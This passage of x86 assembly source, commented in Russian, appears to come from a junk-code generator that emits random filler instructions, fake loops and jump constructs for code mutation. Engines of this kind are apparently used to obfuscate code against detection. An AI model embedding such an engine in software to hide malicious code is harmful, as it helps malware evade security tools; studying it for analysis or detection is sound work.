	jmp		_jsu_rel8_nxt_3_											;и прыгнем на генерацию команды сравнения; 

_jsu_rel8_nxt_2_:														;если же была сгенерирована команда dec reg1, 
	push	02															;тогда случайно определим, будет ли генерироваться команда сравнения или нет (с командой dec reg1 можно и так и так, дальше etc); 
	call	[ebx].rang_addr

	test	eax, eax
	je		_jsu_rel8_nxt_4_

_jsu_rel8_nxt_3_:
_jsu_rel8_trash3_:
;--------------------------------------------------------------------------------------------------------
	push	esi
	mov		esi, xm_xids_addr
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	test	esi, esi
	je		_vju_t3_nxt_
	and		[esi].instr_addr, 0
_vju_t3_nxt_:
	pop		esi
;--------------------------------------------------------------------------------------------------------

	mov		[ebx].tw_trash_addr, edi
	mov		eax, xm_tmp_reg4											;trash3
	mov		[ebx].trash_size, eax
	and		[ebx].nobw, 0

	push	xm_struct2_addr
	push	ebx
	call	xtg_main

	add		edi, [ebx].nobw
	sub		ecx, [ebx].nobw 
	
	xchg	eax, edx													;eax - начальное значение счётчика;
	xchg	edx, esi													;edx - 0 - если команда увеличения счётчика, и адрес (edx != 0), если команда уменьшения счётчика была создана; 
	call	cmp_for_cycle												;генерируем команду сравнения счётчика с другим регом или значением (в дальнейшем может еще с чем-то); 
	or		xm_tmp_reg4, -01											;указываем, что команда сравнения была сгенерирована; 

_jsu_rel8_nxt_4_:
	cmp		xm_tmp_reg2, -01											;затем проверяем, была ли сгенерирована команда инициализации счётчика или же был задействован 2-ой рег?
	je		_jsu_rel8_nxt_5_
	
	;call	unset_r32													;если 2-ой рег, тогда мы его разлочим...; теперь это не нужно вызывать; 
	
	mov		al, 74h														;и у нас будет условный переход je; 
	jmp		_jsu_rel8_nxt_9_
_jsu_rel8_nxt_5_:														;если же команда инициализации счётчика была создана, тогда 
	mov		eax, xm_tmp_reg5											;мы определим, что за команда изменения счётчика была создана?
	cmp		byte ptr [eax], 48h
	jb		_jsu_rel8_nxt_7_
	cmp		byte ptr [eax], 4Fh
	ja		_jsu_rel8_nxt_7_
	inc		xm_tmp_reg4													;если это был dec reg1, тогда проверим, была ли еще сгенерирована команда сравнения?
	jne		_jsu_rel8_nxt_6_											;если нет, тогда у нас будет переход jne; 
	
	push	02															;если же команда сравнения была создана, тогда выберем, какой из вариантов переходов создадим: jne/jxx? 
	call	[ebx].rang_addr

	test	eax, eax
	je		_jsu_rel8_nxt_7_
_jsu_rel8_nxt_6_:														;jne 
	mov		al, 75h
	jmp		_jsu_rel8_nxt_9_
	
_jsu_rel8_nxt_7_:
	xchg	edx, esi													;esi = 0 или любому другому числу; 
	
	push	02
	call	[ebx].rang_addr
	
	xchg	eax, edx													;edx = 0 или 1; 
	test	esi, esi													;далее смотрим, какая команда изменения счётчика была сгенерирована: увеличения или уменьшения? 
	je		_jsu_rel8_nxt_8_
	shl		edx, 01														;если уменьшения (esi != 0), тогда здесь возможны такие варики: jg/jge; 
	add		edx, 05
	mov		al, 78h
	add		al, dl														;!
	jmp		_jsu_rel8_nxt_9_ 
_jsu_rel8_nxt_8_:														;если увеличения, тогда такие варики: jl/jle; 
	shl		edx, 01
	add		edx, 04
	mov		al, 78h
	add		al, dl
_jsu_rel8_nxt_9_:
	mov		edx, edi													;edx = текущему адресу для записи мусора;
	sub		edx, xm_tmp_reg3 											;отнимаем адрес начала trash2 
	inc		edx															;и добавляем 2 (min_size jxx (short))   
	inc		edx
	cmp		edx, 81h													;если полученное значение меньше 81h, тогда сгенерируем jxx_short_up___rel8; 
	jl		_jxx_short_													;иначе jxx_near_up___rel32;
_jxx_near_:																;jxx_near_up___rel32
	mov		byte ptr [edi], 0Fh											;1 byte
	inc		edi
	add		al, 10h														
	stosb																;2 byte;
	xchg	eax, edx													
	add		eax, 04														;!
	neg		eax															;и инвертируем данное значение, так как у нас переход вверх (то есть на младшие адреса aka цикл); 
	stosd																;и полученное с помощью вот такой формулы число записываем - это rel32; other bytes; 
	sub		ecx, 06														;скорректируем кол-во оставшихся байт для дальнейшей записи трэша; 
	jmp		_jsu_rel8_nxt_10_
_jxx_short_:															;jxx_short_up___rel8
	stosb
	xchg	eax, edx
	neg		eax															;и инвертируем данное значение, так как у нас переход вверх (то есть на младшие адреса aka цикл); 
	stosb																;и полученное с помощью вот такой формулы число записываем - это rel8;  
	dec		ecx															;скорректируем кол-во оставшихся байт для дальнейшей записи трэша; 
	dec		ecx

_jsu_rel8_nxt_10_:
;--------------------------------------------------------------------------------------------------------
	mov		esi, xm_xids_addr 
	assume	esi: ptr XTG_INSTR_DATA_STRUCT
	test	esi, esi													;можно ли юзать логику?
	je		_vju_nxt_4_ 

	and		[esi].instr_addr, 0											;если да, тогда сбросим данное поле в 0; 
	pop		[esi].param_1												;и восстановим ранее сохранённое поле; 
;-------------------------------------------------------------------------------------------------------- 
_vju_nxt_4_: 	

	pop		[ebx].nobw													;восстанавливаем из стэка ранее сохранённые значения данных полей структуры; 
	pop		[ebx].xmask2
	pop		[ebx].xmask1
	pop		[ebx].fregs
	pop		[ebx].trash_size
	pop		[ebx].tw_trash_addr											; 

	;pop	xm_tmp_reg0													;разлочим наш счётчик (регистр); 
	;call	unset_r32													;и это теперь не нужно вызывать; 

	jmp		_chk_instr_
;=====================================[JXX_UP REL8/REL32]================================================
	

 	
;====================================[JMP_DOWN REL8/REL32]===============================================
;jxx trash2
;trash1
;jmp next_code
;trash2
;next_code
;
;jxx/jmp short/near etc; 
;
jmp_down___rel8___rel32:
	mov		eax, (2FEh - 06) 
	push	eax
	call	get_rnd_num_1												;получаем СЧ в [0x06..0x2FF] - это будет размер для trash1;
	
	add		eax, 06 
	xchg	eax, esi
	mov		xm_tmp_reg1, esi

	pop		eax
	call	get_rnd_num_1												;получаем СЧ в [0x06..0x2FF] - это будет размер для trash2; 
	
	add		eax, 06
	mov		xm_tmp_reg2, eax
	add		esi, eax													;esi = trash1 + trash2 + 06 (max size of jxx (near)) + 05 (max size of jmp (near)) = 
	add		esi, (06 + 05)												;= 300h + 300h + 06 + 05 = 60Bh (округлили); 
	cmp		ecx, esi													;если кол-во оставшихся для записи мусора байт меньше нужного кол-во байт для генерации данной конструкции, то на выход; 
	jl		_chk_instr_

	push	[ebx].tw_trash_addr											;сохраним в стэке нужные поля структуры, так как мы их будем изменять в дальнейшем; 
	push	[ebx].trash_size
	push	[ebx].nobw

;--------------------------------------------------------------------------------------------------------
	cmp		xm_xids_addr, 0												;можно ли юзать логику? 
	je		_vjmpd_nxt_1_ 
	
	push	esi
	mov		esi, xm_xids_addr
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	push	edx
	
	mov		edx, xm_struct2_addr
	assume	edx: ptr XTG_EXT_TRASH_GEN
	
	push	[edx].xlogic_struct_addr									;и вызовем функу пр0верки логики данной (будущей) конструкции
	push	ebx
	call	let_main

	pop		edx
	cmp		eax, 01														;если по логике проходит, тогда идём дальше
	je		_vjmpd_nxt_3_

	mov		edi, [esi].instr_addr										;иначе коррекируем значения и выходим
	mov		ecx, [esi].norb 
	pop		esi
	jmp		_vjmpd_nxt_4_												;переходим на восстановление других полей другой структы etc; 

_vjmpd_nxt_3_:
	pop		eax 
	push	[esi].param_1 
	or		[esi].param_1, XTG_XIDS_CONSTR								;указываем, что дальше будет генерится мусор, принадлежащий (этой) конструкции
	and		[esi].instr_addr, 0											;сбрасываем адрес в 0 - это нужно для того, чтобы дальше мы снова не проверили эту конструкцию по логике, а проверяли уже новые сгенеренные будущие команды
	xchg	eax, esi													;esi = eax; 
;--------------------------------------------------------------------------------------------------------
_vjmpd_nxt_1_:
	
	push	02															;eax = 02; 
	pop		eax
	cmp		xm_tmp_reg2, 80h											;если размер для trash2 < 80h, тогда jmp будем генерить short (2 bytes)
	jl		_jmpd_nxt_1_
	add		eax, 03														;иначе jmp near (5 bytes); 
_jmpd_nxt_1_:
	sub		ecx, eax													;сразу скорректируем счётчик оставшихся байтеков; 
	mov		esi, eax
	add		eax, xm_tmp_reg1											;далее, добавим к размеру jmp'a размер trash1 
	mov		xm_tmp_reg3, eax
	cmp		eax, 80h													;если полученное значение < 80h, тогда будем генерить jxx short (2 bytes), иначе jxx near (6 bytes); 
	jl		_jmpd_gen_jxx_short_1_
_jmpd_gen_jxx_near_1_:													;generate jxx near; 
	mov		al, 0Fh														;1 byte;
	stosb
	push	edi															;сохраним адрес, после запишем сюда остальные байты;
	add		edi, 05														;stosd + inc edi; перескакиваем на генерацию trash1; 
	jmp		_jmpd_trash1_
_jmpd_gen_jxx_short_1_:													;jxx short; 
	push	edi
	inc		edi
	inc		edi
_jmpd_trash1_:															;trash1
	mov		[ebx].tw_trash_addr, edi
	mov		eax, xm_tmp_reg1
	mov		[ebx].trash_size, eax	
	and		[ebx].nobw, 0
	
	push	xm_struct2_addr
	push	ebx
	call	xtg_main

	pop		edi
	mov		edx, [ebx].nobw

	push	02															;jne/je;
	call	[ebx].rang_addr

	add		al, 74h
	cmp		xm_tmp_reg3, 80h											;generate jxx short or near?
	jl		_jmpd_gen_jxx_short_2_
_jmpd_gen_jxx_near_2_:													;jxx near
	add		al, 10h														;записываем остальные байты;
	stosb
	lea		eax, dword ptr [edx + esi]									;jxx будет указывать на команду, идущую сразу за jmp'ом - то есть jxx указывает на trash2; 
	stosd
	sub		ecx, 06
	jmp		_jmpd_nxt_2_
_jmpd_gen_jxx_short_2_:													;jxx short
	stosb
	lea		eax, dword ptr [edx + esi]  
	stosb
	dec		ecx
	dec		ecx
_jmpd_nxt_2_:
	add		edi, edx 
	sub		ecx, edx 
	push	edi
	add		edi, esi													;перепрыгнем на адрес, по которому сгенерим trash2;
_jmpd_trash2_:															;trash2

;--------------------------------------------------------------------------------------------------------
	push	esi
	mov		esi, xm_xids_addr 
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	test	esi, esi
	je		_vjmpd_t2_nxt_
	and		[esi].instr_addr, 0											;перед каждой рекурсией сбрасываем данное поле в 0, чтобы далее проверялись на логику новые команды, а не снова эта конструкта и т.п.; 
_vjmpd_t2_nxt_:
	pop		esi
;--------------------------------------------------------------------------------------------------------

	mov		[ebx].tw_trash_addr, edi
	mov		eax, xm_tmp_reg2
	mov		[ebx].trash_size, eax	
	and		[ebx].nobw, 0
	
	push	xm_struct2_addr
	push	ebx
	call	xtg_main

	pop		edi
	mov		eax, [ebx].nobw

	cmp		xm_tmp_reg2, 80h											;generate jmp short or near?
	jl		_jmpd_gen_jmp_short_1_
_jmpd_gen_jmp_near_1_:													;jmp near;
	mov		byte ptr [edi], 0E9h
	inc		edi
	stosd
	jmp		_jmpd_nxt_3_
_jmpd_gen_jmp_short_1_:													;jmp short; 
	mov		byte ptr [edi], 0EBh
	inc		edi
	stosb
_jmpd_nxt_3_:
	add		edi, eax 
	sub		ecx, eax

;--------------------------------------------------------------------------------------------------------
	mov		esi, xm_xids_addr 
	assume	esi: ptr XTG_INSTR_DATA_STRUCT
	test	esi, esi													;можно ли юзать логику?
	je		_vjmpd_nxt_4_ 

	and		[esi].instr_addr, 0											;если да, тогда сбросим данное поле в 0; 
	pop		[esi].param_1												;и восстановим ранее сохранённое поле; 
;-------------------------------------------------------------------------------------------------------- 
_vjmpd_nxt_4_: 

	pop		[ebx].nobw
	pop		[ebx].trash_size
	pop		[ebx].tw_trash_addr

	jmp		_chk_instr_													;переходим на генерацию других тем, ёба! 
;====================================[JMP_DOWN REL8/REL32]===============================================
	  


;====================================[JMP_DOWN REL8/REL32]===============================================
jmp_up_jxx_down___rel8___rel32:
;здесь примерно так:
;init_reg1 (push imm8 pop reg1; mov reg1, imm32; etc)
;trash1
;trash2
;chg_reg1 (inc/dec reg1; add/sub reg1, imm8; etc)
;trash3
;cmp_reg1 (cmp reg1, imm8/imm32; etc)
;jxx next_code
;trash4
;jmp trash2
;next_code;
;...
;====================================[JMP_DOWN REL8/REL32]===============================================



;====================================[CMOVXX REG32, REG32]===============================================
;CMOVE	EAX, ECX	etc	(0Fh 4Xh XXh)
cmovxx___r32__r32:
	cmp		ecx, 03
	jl		_chk_instr_
	mov		al, 0Fh
	stosb																;1 byte
	
	push	16
	call	[ebx].rang_addr

	add		al, 40h
	stosb																;2 byte

	call	get_free_r32												;получаем случайный свободный регистр

	xchg	eax, edx

_cmovxx_r32_r32_grr_: 	
	call	get_rnd_r													;получаем случайный любой регистр; 

	cmp		eax, edx													;если регистры равны, то снова выбираем регистры, но так, чтобы они были разные; 
	je		_cmovxx_r32_r32_grr_
	shl		edx, 03
	add		al, 0C0h
	add		eax, edx
	stosb																;3 byte 
	sub		ecx, 03
	jmp		_chk_instr_ 
;====================================[CMOVXX REG32, REG32]===============================================



;========================================[BSWAP REG32]===================================================
;BSWAP	EAX	etc	(0Fh 0C8h) 
bswap___r32:
	cmp		ecx, 02
	jl		_chk_instr_
	mov		al, 0Fh
	stosb

	call	get_free_r32												;выбираем случайный свободный регистр; 

	add		al, 0C8h
	stosb
	dec		ecx
	dec		ecx
	jmp		_chk_instr_ 
;========================================[BSWAP REG32]===================================================



;=====================================[THREE BYTES INSTR]================================================
;BSF	EAX, ECX		etc (0Fh 0BCh XXh)
;BSR	ECX, EDX		etc (0Fh 0BDh etc)
;BT		EDX, EBX		etc (0Fh 0A3h ...)
;BTC	EBX, ESI		etc (0Fh 0BBh)
;BTR	ESI, EDI		etc (0Fh 0B3h)
;BTS	EDI, EAX		etc (0Fh 0ABh)
;IMUL	EAX, ECX		etc (0Fh 0AFh)
;MOVSX	ECX, DL			etc (0Fh 0BEh)
;MOVSX	EDX, BX			etc (0Fh 0BFh)
;MOVZX	EBX, BH			etc (0Fh 0B6h)
;MOVZX	ESI, DI			etc (0Fh 0B7h)
;SHLD	EDX, EBX, CL	etc (0Fh 0A5h)
;SHRD	EDX, EBX, CL	etc (0Fh 0ADh)
;etc 
three_bytes_instr:
	cmp		ecx, 03														;если нам не хватает байтов для генерации данной инструкции, то на выход; 
	jl		_chk_instr_
	mov		al, 0Fh														;иначе запишем 1-ый байтек; 
	stosb
	push	0BCBDA3BBh													;далее в пихаем в стек 2-ые опкоды различных команд; 
	push	0B3ABAFBEh
	push	0BFB6B7A5h
	push	0ADAFB7AFh
	mov		edx, esp													;edx - содержит адрес, где расположены данные опкоды в стЭке; 

	push	16
	call	[ebx].rang_addr

	movzx	eax, byte ptr [edx + eax]									;далее, выберем случайно один из этих байтов; 
	stosb																;и запишем его;
	add		esp, (4 * 4)												;восстанавливаем стек; 

_tbi_mm114r32_:
	call	modrm_mod11_for_r32											;теперь генерим байт modrm, где mod = 11b; 

	mov		edx, xm_tmp_reg1
	cmp		edx, xm_tmp_reg2											;далем так, чтобы реги были разные; 
	je		_tbi_mm114r32_
	stosb																;записываем;
	sub		ecx, 03														;корректируем счётчик; ё!
	jmp		_chk_instr_													;и на выход; 
;=====================================[THREE BYTES INSTR]================================================



;================================[MOV REG32/MEM32, MEM32/REG32]==========================================
;MOV	EAX, DWORD PTR [403000h]	etc (0A1h XXXXXXXXh)
;MOV	ECX, DWORD PTR [403008h]	etc (08Bh XXh XXXXXXXXh)
;MOV	DWORD PTR [40300Ch], EAX	etc (0A3h XXXXXXXXh)
;MOV	DWORD PTR [403010h], ECX	etc (089h XXh XXXXXXXXh)
;etc 
mov___r32_m32__m32_r32:

OFS_MOV_8Bh_r32_m32			equ		50
OFS_MOV_89h_m32_r32			equ		32
OFS_MOV_EAX_0A1h_r32_m32	equ		04
OFS_MOV_EAX_0A3h_m32_r32	equ		01

	cmp		ecx, 06														;если кол-во оставшихся для генерации трэша байтов меньше 6, тогда на выход; 
	jl		_chk_instr_

	call	check_data													;иначе, проверим секцию данных на пригодность; 

	test	eax, eax
	je		_chk_instr_													;если там какая-то хуйня, тогда выходим; 
	
	push	(OFS_MOV_8Bh_r32_m32 + OFS_MOV_89h_m32_r32 + OFS_MOV_EAX_0A1h_r32_m32 + OFS_MOV_EAX_0A3h_m32_r32) 
	call	[ebx].rang_addr												;иначе, случайно, юзая стату, выберем, какую именно команду из данного набора будем генерить; 

	cmp		eax, OFS_MOV_EAX_0A3h_m32_r32
	jl		_mov_eax_m32_r32_
	cmp		eax, (OFS_MOV_EAX_0A3h_m32_r32 + OFS_MOV_EAX_0A1h_r32_m32)
	jl		_mov_eax_r32_m32_
	cmp		eax, (OFS_MOV_EAX_0A3h_m32_r32 + OFS_MOV_EAX_0A1h_r32_m32 + OFS_MOV_89h_m32_r32)
	jge		_mov_r32_m32_
_mov_m32_r32_:															;[MOV DWORD PTR [ADDRESS], REG32] -> REG32 != EAX; 
	mov		al, 89h														;opcode
	jmp		_mov_rmrm_nxt_1_ 
_mov_r32_m32_:															;[MOV REG32, DWORD PTR [ADDRESS]] -> REG32 != EAX; 
	mov		al, 8Bh														;opcode
_mov_rmrm_nxt_1_:
	stosb

_mov_rmrm_gfr32_1_:														;generate MODRM, MOD = 00b (0); 
	call	get_free_r32												;получаем случайный свободный рег, причем рег != EAX; 

	test	eax, eax
	je		_mov_rmrm_gfr32_1_
	shl		eax, 03
	add		al, 05
	stosb																;modrm
	jmp		_mov_rmrm_gro_1_

_mov_eax_m32_r32_:														;[MOV DWORD PTR [ADDRESS], EAX]
	mov		al, 0A3h													;opcode
	jmp		_mov_rmrm_nxt_2_
_mov_eax_r32_m32_:														;[MOV EAX, DWORD PTR [ADDRESS]] 
	mov		al, 0A1h													;opcode
_mov_rmrm_nxt_2_:	
	xchg	eax, edx

	mov		xm_tmp_reg0, XM_EAX											;указываем, что нужно проверить, свободен ли регистр EAX
	call	is_free_r32													;вызываем функу провеки;
	
	inc		eax
	je		_chk_instr_
	xchg	eax, edx
	stosb
	inc		ecx 

_mov_rmrm_gro_1_:														;generate offset (MEM32) 
	call	get_rnd_data_va												;вызываем функу получения случайного адреса, кратного четырем; 
	
	stosd																;offset
	sub		ecx, 06														;корректируем счётчик
	jmp		_chk_instr_													;на выход; 
;================================[MOV REG32/MEM32, MEM32/REG32]==========================================	 



;===================================[MOV MEM32, IMM8/IMM32]==============================================
;MOV	DWORD PTR [403008h], 05			etc (0C7h 05h XXXXXXXXh XXXXXXXXh)
;MOV	DWORD PTR [403010h], 12345678h	etc (0C7h 05h XXXXXXXXh XXXXXXXXh)
;MOV	BYTE PTR [403014h], 01			etc (0C6h 05h XXXXXXXXh XXh)
mov___m32__imm8_imm32:

OFS_MOV_0C7h_m32_imm32		equ		35
OFS_MOV_0C6h_m32_imm8		equ		15

	cmp		ecx, 10														;если кол-во оставшихся байт меньше 10, то на выход; 
	jl		_chk_instr_

	call	check_data													;иначе, проверим секцию данных на пригодность; 

	test	eax, eax
	je		_chk_instr_													;если там какая-то хуйня, тогда выходим; 

	mov		eax, 10000h													;далее, получим СЧ;
	call	get_rnd_num_1

	lea		esi, dword ptr [eax + 01]									;сохраним его в esi и добавим 1;
	xor		edx, edx  

	push	(OFS_MOV_0C7h_m32_imm32 + OFS_MOV_0C6h_m32_imm8)
	call	[ebx].rang_addr 

	cmp		eax, OFS_MOV_0C6h_m32_imm8
	jl		_mov_0C6h_
_mov_0C7h_:																;[MOV MEM32, IMM32]
	inc		edx
_mov_0C6h_:																;[MOV MEM32, IMM8]
	mov		al, 0C6h
	add		al, dl
	stosb																;opcode
	mov		al, 05
	stosb																;modrm

	call	get_rnd_data_va												;получим случайный адрес в секции данных

	stosd																;offset
	xchg	eax, esi													;далее, если был сгенерирован опкод 0C6h, тогда для него imm8, если 0C7h - imm32; 
	imul	edx, edx, 03
 	inc		edx															;edx - число - сколько байт записать: 1 (imm8) или 4 (imm32); 
	sub		ecx, edx													;корректируем 
	sub		ecx, 06 													;счётчик; 
_mov_0C6h_0C7h_stosX_:
	stosb																;imm (8 or 32?); и записываем; 
	ror		eax, 08														;циклически сдвигаемся на 1 байт вправо (чтобы правильно записать imm - смотри в отладчик+); 
	dec		edx
	jne		_mov_0C6h_0C7h_stosX_ 
	jmp		_chk_instr_ 												;на выход, блё! 
;===================================[MOV MEM32, IMM8/IMM32]==============================================
  


;==================================[MOV REG8/MEM8, MEM8/REG8]============================================
;MOV	AL, BYTE PTR [403000h]		etc (0A0h XXXXXXXXh)
;MOV	CL, BYTE PTR [403008h]		etc (08Ah XXh XXXXXXXXh)
;MOV	BYTE PTR [40300Ch], AL		etc (0A2h XXXXXXXXh)
;MOV	BYTE PTR [403010h], CL		etc (088h XXh XXXXXXXXh)
;etc 
mov___r8_m8__m8_r8:

OFS_MOV_8Ah_r8_m8			equ		55
OFS_MOV_88h_m8_r8			equ		35
OFS_MOV_EAX_0A0h_r8_m8		equ		05
OFS_MOV_EAX_0A2h_m8_r8		equ		05

	cmp		ecx, 06														;если кол-во оставшихся для генерации трэша байтов меньше 6, тогда на выход; 
	jl		_chk_instr_

	call	check_data													;иначе, проверим секцию данных на пригодность; 

	test	eax, eax
	je		_chk_instr_													;если там какая-то хуйня, тогда выходим; 
	
	push	(OFS_MOV_8Ah_r8_m8 + OFS_MOV_88h_m8_r8 + OFS_MOV_EAX_0A0h_r8_m8 + OFS_MOV_EAX_0A2h_m8_r8) 
	call	[ebx].rang_addr												;иначе, случайно, юзая стату, выберем, какую именно команду из данного набора будем генерить; 

	cmp		eax, OFS_MOV_EAX_0A2h_m8_r8
	jl		_mov_eax_m8_r8_
	cmp		eax, (OFS_MOV_EAX_0A2h_m8_r8 + OFS_MOV_EAX_0A0h_r8_m8)
	jl		_mov_eax_r8_m8_
	cmp		eax, (OFS_MOV_EAX_0A2h_m8_r8 + OFS_MOV_EAX_0A0h_r8_m8 + OFS_MOV_88h_m8_r8)
	jge		_mov_r8_m8_
_mov_m8_r8_:															;[MOV MEM8, REG8] -> REG8 != AL; 
	mov		al, 88h														;opcode
	jmp		_mov_rmrm_nxt_01_ 
_mov_r8_m8_:															;[MOV REG8, MEM8] -> REG8 != AL; 
	mov		al, 8Ah														;opcode
_mov_rmrm_nxt_01_:
	stosb

_mov_rmrm_gfr8_1_:														;generate MODRM, MOD = 00b (0); 
	call	get_free_r8													;получаем случайный свободный рег, причем рег != AL; 

	test	eax, eax 
	je		_mov_rmrm_gfr8_1_
	shl		eax, 03
	add		al, 05
	stosb																;modrm
	jmp		_mov_rmrm_gro_01_

_mov_eax_m8_r8_:														;[MOV MEM8, AL]
	mov		al, 0A2h													;opcode
	jmp		_mov_rmrm_nxt_02_
_mov_eax_r8_m8_:														;[MOV AL, MEM8] 
	mov		al, 0A0h													;opcode
_mov_rmrm_nxt_02_:	
	xchg	eax, edx

	mov		xm_tmp_reg0, XM_EAX											;указываем, что нужно проверить, свободен ли регистр EAX (AL, но не AH!); 
	call	is_free_r32													;вызываем функу провеки;
	
	inc		eax
	je		_chk_instr_
	xchg	eax, edx
	stosb
	inc		ecx 

_mov_rmrm_gro_01_:														;generate offset (MEM8) 
	call	get_rnd_data_va												;вызываем функу получения случайного адреса, кратного четырем; 
	
	stosd																;offset
	sub		ecx, 06														;корректируем счётчик
	jmp		_chk_instr_													;на выход; 
;==================================[MOV REG8/MEM8, MEM8/REG8]============================================



;=======================================[INC/DEC MEM32]==================================================
;INC	DWORD PTR [403008h]	etc (0FFh 05h XXXXXXXXh)
;DEC	DWORD PTR [40300Ch]	etc (0FFh 0Dh XXXXXXXXh)
inc_dec___m32:
	cmp		ecx, 06														;если кол-во оставшихся для генерации трэша байтов меньше 6, тогда на выход;  
	jl		_chk_instr_ 

	call	check_data													;иначе, проверим секцию данных на пригодность; 

	test	eax, eax
	je		_chk_instr_													;если там какая-то хуйня, тогда выходим; 

	mov		al, 0FFh													;opcode (1 bytes)
	stosb 

	push	02															;сгенерировать inc или dec?
	call	[ebx].rang_addr

	shl		eax, 03
	add		al, 05
	stosb																;modrm

	call	get_rnd_data_va												;вызываем функу получения случайного адреса, кратного четырем; 

	stosd																;offset (MEM32); 
	sub		ecx, 06														;корректируем счётчик;
	jmp		_chk_instr_													;айда на выход! 
;=======================================[INC/DEC MEM32]==================================================
 


;==========================[ADC/ADD/AND/OR/SBB/SUB/XOR REG32, MEM32]=====================================
;ADC	ECX, DWORD PTR [403008h]	etc (13h XXh XXXXXXXXh)				;выбраны именно данные опкоды, так как другие опкоды для данных команд ms не генерирует; 
;ADD	EAX, DWORD PTR [40300Ch]	etc (03h XXh XXXXXXXXh)
;AND	EAX, DWORD PTR [403010h]	etc (23h XXh XXXXXXXXh)
;OR		ESI, DWORD PTR [403014h]	etc (0Bh XXh XXXXXXXXh)
;SBB	EDI, DWORD PTR [403018h]	etc (1Bh XXh XXXXXXXXh) 
;SUB	EBX, DWORD PTR [40301Ch]	etc (2Bh XXh XXXXXXXXh) 
;XOR	ECX, DWORD PTR [403020h]	etc (33h XXh XXXXXXXXh) 
;etc  
adc_add_and_or_sbb_sub_xor___r32__m32:
 
OFS_XOR_33h_r32_m32			equ		05
OFS_ADD_03h_r32_m32			equ		35
OFS_SUB_2Bh_r32_m32			equ		25
OFS_AAAOSSX_r32_m32			equ		05

	cmp		ecx, 06 
	jl		_chk_instr_ 

	call	check_data													;иначе, проверим секцию данных на пригодность; 

	test	eax, eax
	je		_chk_instr_													;если там какая-то хуйня, тогда выходим; 
	
	push	(OFS_XOR_33h_r32_m32 + OFS_ADD_03h_r32_m32 + OFS_SUB_2Bh_r32_m32 + OFS_AAAOSSX_r32_m32)
	call	[ebx].rang_addr

	cmp		eax, OFS_AAAOSSX_r32_m32 
	jl		_aaaossx_r32_m32_
	cmp		eax, (OFS_AAAOSSX_r32_m32 + OFS_SUB_2Bh_r32_m32)
	jl		_r32m32_2Bh_
	cmp		eax, (OFS_AAAOSSX_r32_m32 + OFS_SUB_2Bh_r32_m32 + OFS_ADD_03h_r32_m32)
	jge		_r32m32_33h_
_r32m32_03h_:															;[ADD REG32, MEM32]
	mov		al, 03h 
	jmp		_r32m32_2Bh_03h_33h_
_r32m32_2Bh_:															;[SUB REG32, MEM32]
	mov		al, 2Bh														
	jmp		_r32m32_2Bh_03h_33h_
_r32m32_33h_:															;[XOR REG32, MEM32]
	mov		al, 33h
	jmp		_r32m32_2Bh_03h_33h_ 

_aaaossx_r32_m32_:														;[все остальные доступные здесь опкоды, включая снова 03h, 2Bh, 33h]
	push	07															;далее идет алгоритм случайной генерации одного из заданных опкодов
	call	[ebx].rang_addr 
	
	shl		eax, 03
	add		al, 03
_r32m32_2Bh_03h_33h_:	
	stosb																;запишем сгенерированный опкод

	call	get_free_r32

	shl		eax, 03
	add		al, 05
	stosb

	call	get_rnd_data_va												;вызываем функу получения случайного адреса, кратного четырем; 

	stosd 
	sub		ecx, 06
	jmp		_chk_instr_ 												;отправляемся на генерацию следующей инструкции/конструкции; 
;==========================[ADC/ADD/AND/OR/SBB/SUB/XOR REG32, MEM32]=====================================



;==========================[ADC/ADD/AND/OR/SBB/SUB/XOR MEM32, REG32]=====================================
;ADC	DWORD PTR [403008h], EAX	etc (11h XXh XXXXXXXXh)				;выбраны именно данные опкоды, так как другие опкоды для данных команд ms не генерирует; 
;ADD	DWORD PTR [40300Ch], ECX	etc (01h XXh XXXXXXXXh)
;AND	DWORD PTR [403010h], EDX	etc (21h XXh XXXXXXXXh)
;OR		DWORD PTR [403014h], EBX	etc (09h XXh XXXXXXXXh)
;SBB	DWORD PTR [403018h], ESP	etc (19h XXh XXXXXXXXh) 
;SUB	DWORD PTR [40301Ch], EBP	etc (29h XXh XXXXXXXXh) 
;XOR	DWORD PTR [403020h], ESI	etc (31h XXh XXXXXXXXh) 
;etc  
adc_add_and_or_sbb_sub_xor___m32__r32:
 
OFS_XOR_31h_m32_r32			equ		02
OFS_ADD_01h_m32_r32			equ		15
OFS_SUB_29h_m32_r32			equ		10
OFS_AAAOSSX_m32_r32			equ		01

	cmp		ecx, 06 
	jl		_chk_instr_ 

	call	check_data													;иначе, проверим секцию данных на пригодность; 

	test	eax, eax
	je		_chk_instr_													;если там какая-то хуйня, тогда выходим; 
	
	push	(OFS_XOR_31h_m32_r32 + OFS_ADD_01h_m32_r32 + OFS_SUB_29h_m32_r32 + OFS_AAAOSSX_m32_r32)
	call	[ebx].rang_addr

	cmp		eax, OFS_AAAOSSX_m32_r32 
	jl		_aaaossx_m32_r32_
	cmp		eax, (OFS_AAAOSSX_m32_r32 + OFS_SUB_29h_m32_r32)
	jl		_m32r32_29h_
	cmp		eax, (OFS_AAAOSSX_m32_r32 + OFS_SUB_29h_m32_r32 + OFS_ADD_01h_m32_r32)
	jge		_m32r32_31h_
_m32r32_01h_:															;[ADD MEM32, REG32]
	mov		al, 01h 
	jmp		_m32r32_29h_01h_31h_
_m32r32_29h_:															;[SUB MEM32, REG32]
	mov		al, 29h														
	jmp		_m32r32_29h_01h_31h_
_m32r32_31h_:															;[XOR MEM32, REG32]
	mov		al, 31h
	jmp		_m32r32_29h_01h_31h_ 

_aaaossx_m32_r32_:														;[все остальные доступные здесь опкоды, включая снова 03h, 2Bh, 33h]
	push	07															;далее идет алгоритм случайной генерации одного из заданных опкодов
	call	[ebx].rang_addr 
	
	shl		eax, 03
	add		al, 01
_m32r32_29h_01h_31h_:	
	stosb																;запишем сгенерированный опкод

	call	get_rnd_r													;получаем случайный регистр; 

	shl		eax, 03
	add		al, 05
	stosb

	call	get_rnd_data_va												;вызываем функу получения случайного адреса, кратного четырем; 

	stosd 
	sub		ecx, 06
	jmp		_chk_instr_ 												;отправляемся на генерацию следующей инструкции/конструкции; 
;==========================[ADC/ADD/AND/OR/SBB/SUB/XOR MEM32, REG32]=====================================
  


;=======================[ADC/ADD/AND/OR/SBB/SUB/XOR REG8/MEM8, MEM8/REG8]================================
;ADC	AL, BYTE PTR [403008h]	etc (12h XXh XXXXXXXXh)						;частоты данных опкодов малы, поэтому решил их генерировать так
;ADD	CL, BYTE PTR [40300Ch]	etc (02h XXh XXXXXXXXh)						;стата учитывается только для всей группы данных опкодов; 
